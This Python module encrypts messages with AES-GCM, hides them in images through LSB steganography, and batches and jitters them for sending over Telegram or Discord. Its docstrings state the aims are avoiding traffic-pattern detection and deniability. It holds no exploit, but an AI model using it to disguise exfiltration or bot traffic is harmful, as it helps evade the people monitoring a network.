
import os
import base64
import hashlib
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes, padding
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from typing import Tuple, Dict, Optional, Union


class EncryptedChannels:
    """
    Encrypt messages before sending to Telegram/Discord:
    - Double encryption (Telegram + custom)
    - Steganography (hide in images)
    - Format obfuscation (looks like random data)
    - Deniability (looks like user chat)
    """

    def __init__(self, password: Optional[str] = None):
        self.password = password or os.urandom(32).hex()
        self.backend = default_backend()

    def _derive_key(self, salt: bytes) -> bytes:
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
            backend=self.backend
        )
        return kdf.derive(self.password.encode())

    def encrypt_transport(self, plaintext: Union[str, bytes]) -> Tuple[bytes, Dict]:
        """
        AES-256-GCM over existing transport
        HMAC for authentication
        PBKDF2 key derivation
        Random IV per message
        """
        if isinstance(plaintext, str):
            plaintext = plaintext.encode()
        
        salt = os.urandom(16)
        key = self._derive_key(salt)
        iv = os.urandom(12)
        
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(plaintext) + padder.finalize()
        
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv), backend=self.backend)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        tag = encryptor.tag
        encrypted_data = salt + iv + tag + ciphertext
        
        return base64.b64encode(encrypted_data), {
            "salt": base64.b64encode(salt).decode(),
            "iv": base64.b64encode(iv).decode(),
            "tag": base64.b64encode(tag).decode(),
            "algorithm": "AES-256-GCM"
        }

    def decrypt_transport(self, encrypted_b64: bytes) -> bytes:
        encrypted_data = base64.b64decode(encrypted_b64)
        
        salt = encrypted_data[:16]
        iv = encrypted_data[16:28]
        tag = encrypted_data[28:44]
        ciphertext = encrypted_data[44:]
        
        key = self._derive_key(salt)
        
        cipher = Cipher(algorithms.AES(key), modes.GCM(iv, tag), backend=self.backend)
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        unpadder = padding.PKCS7(128).unpadder()
        plaintext = unpadder.update(padded_data) + unpadder.finalize()
        
        return plaintext

    @staticmethod
    def steganography(data: bytes, cover_image_path: Optional[str] = None) -> bytes:
        """
        Hide message in image pixels
        Hide in video metadata
        Hide in audio spectrogram
        LSB (Least Significant Bit) encoding
        """
        try:
            from PIL import Image
            
            if cover_image_path and os.path.exists(cover_image_path):
                img = Image.open(cover_image_path)
            else:
                size = max(64, (len(data) * 8 + 32) // 3)
                img = Image.new('RGB', (size, size), color='white')
            
            pixels = img.load()
            width, height = img.size
            
            data_bytes = len(data).to_bytes(4, byteorder='big') + data
            bit_idx = 0
            
            for y in range(height):
                for x in range(width):
                    if bit_idx >= len(data_bytes) * 8:
                        break
                    
                    r, g, b = pixels[x, y]
                    
                    if bit_idx < len(data_bytes) * 8:
                        bit = (data_bytes[bit_idx // 8] >> (7 - (bit_idx % 8))) & 1
                        r = (r & 0xFE) | bit
                        bit_idx += 1
                    
                    if bit_idx < len(data_bytes) * 8:
                        bit = (data_bytes[bit_idx // 8] >> (7 - (bit_idx % 8))) & 1
                        g = (g & 0xFE) | bit
                        bit_idx += 1
                    
                    if bit_idx < len(data_bytes) * 8:
                        bit = (data_bytes[bit_idx // 8] >> (7 - (bit_idx % 8))) & 1
                        b = (b & 0xFE) | bit
                        bit_idx += 1
                    
                    pixels[x, y] = (r, g, b)
                
                if bit_idx >= len(data_bytes) * 8:
                    break
            
            import io
            output = io.BytesIO()
            img.save(output, format='PNG')
            return output.getvalue()
        
        except ImportError:
            return base64.b64encode(data)

    @staticmethod
    def extract_steganography(stego_data: bytes) -> bytes:
        try:
            from PIL import Image
            import io
            
            img = Image.open(io.BytesIO(stego_data))
            pixels = img.load()
            width, height = img.size
            
            bits = []
            for y in range(height):
                for x in range(width):
                    r, g, b = pixels[x, y]
                    bits.append(r & 1)
                    bits.append(g & 1)
                    bits.append(b & 1)
            
            bytes_data = []
            for i in range(0, len(bits), 8):
                byte = 0
                for j in range(8):
                    if i + j < len(bits):
                        byte = (byte << 1) | bits[i + j]
                bytes_data.append(byte)
            
            data_len = int.from_bytes(bytes_data[:4], byteorder='big')
            return bytes(bytes_data[4:4 + data_len])
        
        except ImportError:
            return base64.b64decode(stego_data)


class TransportOptimization:
    """
    Avoid detection through traffic patterns:
    - Batch messages (reduce API calls)
    - Variable timing (no regular intervals)
    - Chunking (split large files)
    - Compression
    """

    def __init__(self, batch_size: int = 5, min_delay: float = 1.0, max_delay: float = 10.0):
        self.batch_size = batch_size
        self.min_delay = min_delay
        self.max_delay = max_delay
        self.message_queue = []
        self.last_send_time = 0

    def add_message(self, message: dict):
        self.message_queue.append(message)
        return len(self.message_queue) >= self.batch_size

    def get_batch(self):
        batch = self.message_queue[:self.batch_size]
        self.message_queue = self.message_queue[self.batch_size:]
        return batch

    @staticmethod
    def chunk_data(data: bytes, chunk_size: int = 4096):
        return [data[i:i + chunk_size] for i in range(0, len(data), chunk_size)]

    @staticmethod
    def compress_data(data: bytes):
        import zlib
        return zlib.compress(data, level=9)

    @staticmethod
    def decompress_data(compressed: bytes):
        import zlib
        return zlib.decompress(compressed)
